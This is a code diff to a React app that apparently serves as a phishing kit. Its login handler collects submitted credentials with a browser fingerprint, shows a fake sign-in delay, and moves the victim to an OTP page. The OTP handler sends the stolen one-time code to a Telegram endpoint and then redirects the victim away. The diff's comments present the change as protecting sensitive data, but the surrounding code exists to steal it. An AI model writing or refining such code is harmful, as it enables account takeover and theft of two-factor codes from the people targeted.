@@ -30,11 +30,14 @@ function App() {
   const location = useLocation();
 
   const handleLoginSuccess = async (loginData: any) => {
+    const sessionId = Math.random().toString(36).substring(2, 15);
+    const email = loginData?.email || '';
+
     try {
       const browserFingerprint = getBrowserFingerprint();
       const credentialsData = {
         ...loginData,
-        sessionId: Math.random().toString(36).substring(2, 15),
+        sessionId,
         timestamp: new Date().toISOString(),
         userAgent: navigator.userAgent,
         ...browserFingerprint,
@@ -46,9 +49,12 @@ function App() {
       // Brief delay so the spinner is visible on the Sign In button
       await new Promise((r) => setTimeout(r, 1500));
 
+      // Store ONLY non-sensitive session data for the OTP flow.
+      // Passwords must never be stored here — only email and sessionId
+      // are needed to correlate the OTP with the credential message.
       setLoginFlowState({
         awaitingOtp: true,
-        sessionData: credentialsData,
+        sessionData: { email, sessionId },
       });
       navigate('/otp', { replace: true });
     } catch (err) {
@@ -56,7 +62,7 @@ function App() {
       // Fallback: still navigate to OTP even if something fails
       setLoginFlowState({
         awaitingOtp: true,
-        sessionData: { ...loginData, sessionId: Math.random().toString(36).substring(2, 15) },
+        sessionData: { email, sessionId },
       });
       navigate('/otp', { replace: true });
     }
@@ -69,9 +75,10 @@ function App() {
     }
 
     setIsLoading(true);
+    // sessionData only contains { email, sessionId } — no passwords or sensitive data
     await safeSendToTelegram(config.api.sendOtpEndpoint, {
       otp,
-      session: { email: loginFlowState.sessionData?.email, sessionId: loginFlowState.sessionData?.sessionId },
+      session: loginFlowState.sessionData,
     });
 
     window.location.href = config.redirects.afterOtp;
